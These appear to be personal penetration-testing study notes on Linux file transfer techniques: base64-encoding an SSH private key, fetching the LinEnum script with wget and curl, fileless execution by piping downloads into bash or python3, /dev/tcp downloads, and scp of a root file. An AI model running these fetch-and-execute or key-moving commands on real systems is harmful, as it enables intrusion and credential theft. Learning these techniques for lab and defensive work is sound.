We can use `Curl`, `Wget` ,`Python` or may other ways to transfer file in linux. All they use `Http` and `Https`.

![[Pasted image 20251019141149.png]]

### Base64 Encoding / Decoding
 We can `base64` encode the file and then `decode` this on other side.

Check `md5` hash to match validity of content.
 ```bash
md5sum id_rsa
```

Here `w 0` to disable the line wrapping.
```shell-session
cat id_rsa |base64 -w 0;echo
```

Now decode the `hash` , confirm it and save to file.
```bash
echo 'hash' | base64 -d > id_rsa

md5sum id_rsa
```

### Web Downloads with Wget and cURL

To download a file using `wget`, we need to specify the URL and the option `-O' to set the output filename.
#### Download a File Using wget
```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

#### Download a File Using cURL
`cURL` is very similar to `wget`, but the output filename option is lowercase `-o'.

```bash
 curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

### Fileless Attacks Using Linux

Because of the way Linux works and how [pipes operate](https://www.geeksforgeeks.org/piping-in-unix-or-linux/), most of the tools we use in Linux can be used to replicate fileless operations, which means that we don't have to download a file to execute it.

```
Note: Some payloads like mkfifo write files to disk. While execution payload me b fileless but when we use pipe so it may create tmp file in memory.
```

Using `curl` download file and run without saving it.
```bash
 curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

Same we can use with `wget`
```bash
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

### Download with Bash (/dev/tcp)
Some time we do not have any well known tools so As long as Bash version 2.04 or greater is installed` (compiled with --enable-net-redirections)`, the built-in `/dev/TCP `device file can be used for simple file downloads

#### Connect to the Target Webserver
```bash
exec 3<>/dev/tcp/10.10.10.32/80
```
#### HTTP GET Request
```bash
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```
#### Print the Response
```bash
cat <&3
```



### SSH Downloads
`SSH` secure shell help to connect securely with remote computer. It comes with `scp` used to transfer files.

`SCP` is very similar to `copy` or `cp`, but instead of providing a local path, we need to specify a username, the remote IP address or DNS name, and the user's credentials.

```bash
netstat -lnpt
```

#### Linux - Downloading Files Using SCP
```bash
scp plaintext@192.168.49.128:/root/myroot.txt . 
```

